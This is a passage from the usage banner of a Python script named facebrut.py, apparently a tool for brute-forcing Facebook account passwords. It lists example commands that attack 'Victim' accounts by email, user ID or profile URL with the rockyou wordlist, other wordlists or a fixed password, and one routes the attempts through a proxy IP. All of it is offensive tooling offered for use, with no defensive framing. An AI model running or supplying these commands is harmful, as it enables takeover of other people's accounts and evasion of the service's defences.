...
Usage: python facebrut.py [OPTIONS...]
-------------
OPTIONS:
       |
    |--------
    ...
    |--------
    | -u/--update                             ::> Update facebrut Script
-------------
Examples:
        |
     |--------
     | python facebrut.py -t Victim@gmail.com -w /usr/share/wordlists/rockyou.txt
     |--------
     | python facebrut.py -t 100001013078780 -w C:\\Users\\Me\\Desktop\\wordlist.txt
     |--------
     | python facebrut.py -t Victim@hotmail.com -w D:\\wordlist.txt -p 144.217.101.245:3129
     |--------
     | python facebrut.py -t Victim@gmail.com -s 1234567
     |--------
     | python facebrut.py -g https://www.facebook.com/Victim_Profile
     |--------
""")
